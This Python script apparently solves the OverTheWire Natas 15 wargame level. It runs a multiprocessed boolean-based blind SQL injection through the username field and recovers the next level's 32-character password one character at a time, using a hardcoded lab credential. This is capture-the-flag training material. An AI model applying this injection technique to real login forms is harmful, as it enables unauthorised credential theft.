import requests
from requests.auth import HTTPBasicAuth
import string
import multiprocessing
import time


possibilities = list(string.ascii_letters + string.digits)


def send_request(character, password):
    result = requests.post(url='http://natas15.natas.labs.overthewire.org', json={'debug':True}, auth=HTTPBasicAuth('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'), data={'username':f'natas16" and BINARY SUBSTRING(password, 1, {len(password) + 1}) = \'{password + character}\' -- "'}) 
    return result.content.decode(), character

def filter_results(result):
    result = result[0]
    if "This user doesn't exist." in result:
        return False
    elif "This user exists." in result:
        return True
    else:
        return False

def get_password(password: str, max_len):
    print(password)
    if len(password) == max_len:
        return password
    extended_possibilities = list(map(lambda x: (x, password), possibilities))
    with multiprocessing.Pool(int(len(possibilities)/3)) as pool:
        res_map = pool.starmap(send_request, extended_possibilities)
    pass_frag = list(filter(filter_results, res_map))
    return get_password(password + pass_frag[0][1], max_len)


if __name__ == "__main__":
    start = time.time()
    print(f"The password is: {get_password('', 32)}")
    print(f"took {time.time()-start}")